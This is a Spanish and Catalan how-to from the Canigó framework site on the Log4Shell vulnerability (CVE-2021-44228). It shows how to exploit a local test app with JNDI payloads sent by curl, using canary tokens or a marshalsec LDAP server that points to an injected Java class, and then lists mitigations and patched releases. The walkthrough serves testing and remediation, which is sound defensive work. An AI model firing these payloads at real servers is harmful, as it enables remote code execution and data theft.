+++
date        = "2021-12-13"
title       = "Canigó. Vulnerabilidad: CVE-2021-44228 (log4jshell)"
description = "Como correguir la vulnerabilidad CVE-2021-44228 (log4jshell)"
section     = "howtos"
categories  = ["canigo"]
key         = "GENER2022"
+++

Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando una petición JNDI `${jndi:(ldap|rmi|etc)}` dentro cualquier variable que se registre en el log del servidor. Para explotar la vulnerabilidad, se siguen estos pasos:

1. En el servidor que aloja la aplicación vulnerable, se registra la información que contiene la carga útil maliciosa, por ejemplo: `${jndi:ldap://[servidor]/[carga útil]}`, donde el servidor está controlado por el atacante y la carga útil contiene el comando a ejecutar.
2. La vulnerabilidad se activa y el servidor vulnerable, solicita al servidor del atacante a través de JNDI el código malicioso.
3. La respuesta del servidor del atacante contiene la ruta a una clase Java maliciosa, por ejemplo: `http://[servidor]/exploit.class`, que se inyecta en el contexto de la aplicación vulnerable.
4. La carga útil inyectada permite al atacante ejecutar código arbitrario.

> fuentes: \
> <https://github.com/YfryTchsGD/Log4jAttackSurface> \
> <https://github.com/christophetd/log4shell-vulnerable-app> \
> <https://www.tarlogic.com/blog/log4shell-vulnerability-cve-2021-44228/> \
> <https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/> \
> <https://www.randori.com/blog/cve-2021-44228/>

## Como explotar la vulnerabilidad en Canigó

 1- Crear una aplicación con el archetype de Canigó por ejemplo: `CanigoLog4jShellTest`

  ```sh
  # Canigó 3.6
  mvn archetype:generate \ 
  -DarchetypeGroupId=cat.gencat.ctti \
  -DarchetypeArtifactId=plugin-canigo-archetype-rest \
  -DarchetypeVersion=1.7.0 \
  -DartifactId=CanigoLog4jShellTest \
  -DgroupId=cat.gencat.ctti \
  -Dversion=1.0.0 -B
  ```

 2- Modificar el servicio de pruebas: `EquipamentServiceController` para imprimir en el log, los parámetros de entrada del servicio de creación de equipaments

  ```java
  import org.apache.logging.log4j.LogManager;
  import org.apache.logging.log4j.Logger;
  
  private static Logger log = LogManager.getLogger(EquipamentServiceController.class.getName());

  public void saveEquipament(@RequestBody Equipament equipament) {
    log.error("equipament.getNom() {}", equipament.getNom());
    ...
  }
  ```

 3- Iniciar el proyecto creado con el servidor tomcat embebido, por ejemplo:

  ```sh
  mvn clean spring-boot:run

  # or

  mvn clean package && java -jar ./target/CanigoLog4jShellTest.war

  # or

  mvn clean package docker:build \
    && docker run -it --rm \
    --net=host \
    --name="log4jshell-local" \
    --memory="1024m" --memory-reservation="1024m" --memory-swap="1024m" --cpu-shares=2000 \
    canigo/app
  ```

### Utilizando el proyecto `canarytokens`

---

> El proyecto de código abierto: `canarytokens` permite generar tokens para explotar vulnerabilidades. \
> Sí al utilizar un token se explota una vulnerabilidad, se envía un correo electrónico con los detalles del acceso \
> <https://docs.canarytokens.org/guide/> \
> <https://github.com/thinkst/canarytokens> \

 4- Generar un token tipo `log4jshell` desde: <https://canarytokens.org/generate#>, por ejemplo:

  ```txt
  ${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
  ```

 5- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`

  ```sh
  curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
    --header 'Content-Type: application/json' \
    --data-raw '{ "nom": "${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}","municipi": "Barcelona"}'
  ```

 6- Verificar en el buzón del correo configurado en `canarytokens` y comprobar el correo con la traza de la conexión remota al servidor de la aplicación

  ![Email exploit test](/images/howtos/log4jshell/email_exploit_alert.png)

  ![Canary tokens exploit details 1](/images/howtos/log4jshell/canary_token_exploit_details1.png)

  ![Canary tokens exploit details 2](/images/howtos/log4jshell/canary_token_exploit_details2.png)

### Utilizando un servidor LDAP

---

> Se requiere: SO Linux, Python3, git, maven, acceso a internet

 4- Iniciar un servidor web que contenga el código malicioso a inyectar

  > Se puede utilizar el proyecto `https://github.com/cybereason/Logout4Shell.git` y modificar la clase `Log4jRCE.java` para agregar cualquier código malicioso que se quiera inyectar en un servidor. \
  > Por ejemplo se puede agregar este código para inyectar en el servidor una traza

  ```java
    String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
    System.out.println("Log4JShell - JPJE ----------------------------: " + dateNow);
  ```

  ```sh
  git clone https://github.com/cybereason/Logout4Shell.git
  mvn clean package
  cd target/classes
  python3 -m http.server 8888
  ```

 5- Iniciar un servidor LDAP

  > Se puede utilizar el proyecto `https://github.com/mbechler/marshalsec.git`

  ```sh
  git clone https://github.com/mbechler/marshalsec.git
  mvn clean package -DskipTests
  java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
  ```

 6- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar `${jndi:ldap://127.0.0.1:1389/a}`

  ```sh
  curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
    --header 'Content-Type: application/json' \
    --data-raw '{ "nom": "${jndi:ldap://127.0.0.1:1389/a}","municipi": "Barcelona"}'
  ```

 7- Revisar en el log de la aplicación `CanigoLog4jShellTest` los efectos de explotar la vulnerabilidad

  > Con la vulnerabilidad

  ![LDAP exploit](/images/howtos/log4jshell/log4jshell_trace1.gif)

  > Sin la vulnerabilidad

  ![LDAP no exploit](/images/howtos/log4jshell/log4jshell_trace2.gif)

  > Se puede apreciar en el log de `CanigoLog4jShellTest` la traza generada por el código inyectado. Se podria obtener por ejemplo, todas las variables de entorno, o los archivos de configuración y enviarlos por correo

## Como solventar/mitigar la vulnerabilidad

---

 1- Sustituir la version de la dependencia de la librería `log4j` (tiempo de compilación). Por ejemplo:

  1-1 modificando el: `pom.xml` (Opción recomendada) (requiere recompilar y redesplegar)

  ```xml
  <properties>
    <log4j2.version>2.15.0</log4j2.version>
  </properties>
  ```

  1-2 inyectando la variable durante la construcción de la aplicación (requiere recompilar y redesplegar)

  ```sh
  mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
  ```

 2- Configurar la variable: `log4j2.formatMsgNoLookups (tiempo de ejecución)

  2-1 inyectando la variable (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)

  ```sh
  mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
  ```

  2-2 agregando una variable de entorno (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)

  > fuente: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/

  ```sh
  mvn clean package docker:build \
    && docker run -it --rm \
    --net=host \
    --name="log4jshell-local" \
    --memory="1024m" --memory-reservation="1024m" --memory-swap="1024m" --cpu-shares=2000 \
    --env LOG4J_FORMAT_MSG_NO_LOOKUPS=true \
    canigo/app
  ```

 3- Modificar el patron de trazas configuradas en el archivo: `log4j.xml` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:

  > fuente: https://kb.vmware.com/s/article/87093

  ```sh
  ## cambiar:
  <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m%n" />

  ## por:
  <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m{nolookups}%n" />
  ```

 4- Eliminar la clase `maliciosa` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:

  ```sh
  zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  ```

<br/>

## Utilització de Canigó 3.4.7 i 3.6.1

S'ha alliberat Canigó 3.4.7 i 3.6.1 corresponents a les versions de Canigó 3.4 i 3.6 per a resoldre aquesta vulnerabilitat als mòduls de Canigó. Podeu consultar la noticia [Publicació nova versió 3.4.7 i 3.6.1](/noticies/2021-12-13-CAN-actualitzacio-canigo-3_4_7_3_6_1)

S'ha alliberat també la versió 1.6.8 de l'archetype de Canigó per generar projectes amb Canigó 3.4.7. Podeu consultar la noticia [Actualització archetype 1.6.8](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_6_8/)

A més s'ha alliberat la versió 1.7.1 de l'archetype de Canigó i la versió 1.8.1 del plugin del eclipse per generar projectes amb Canigó 3.6.1. Podeu consultar la noticia [Actualització archetype 1.7.1 i plugin Eclipse 1.8.1](/noticies/2021-12-13-CAN-Actualitzacio_archetype_1_7_1_plugin_eclipse_1_8_1/)

Des de CS Canigó es recomana actualitzar-se de forma urgent a aquestes versions de Canigó, per a això és necessari revisar les dependències de l'aplicació per a utilitzar els mòduls de les versions 3.4.7 i 3.6.1, per això podeu consultar les matrius de compatibiltiat de les versions:

- [Matrius de Compatibilitats 3.4](/canigo-download-related/matrius-compatibilitats/canigo-34/)

- [Matrius de Compatibilitats 3.6](/canigo-download-related/matrius-compatibilitats/canigo-36/)

Una vegada comprovats que s'utilitzen les versions dels mòduls correstes, seguir el punt 1-1, descrit anteriorment, modificant el `pom.xml` de l'aplicació per assegurar que s'utilitza la versió 2.15.0 del log4j

 ```xml
  <properties>
    <log4j2.version>2.15.0</log4j2.version>
  </properties>
  ```
Una vegada realitzades les modificacions comprovar que només s'utilitza la versió 2.15.0 del log4j a l'aplicació executant:

 ```
 mvn dependency:tree
 ```

<br>
Per qualsevol dubte relatiu a aquesta nova versió del Framework Canigó us podeu posar en contacte amb el CS Canigó al servei CAN del JIRA CSTD o enviant-nos un correu electrònic a la bústia del CS Canigó.
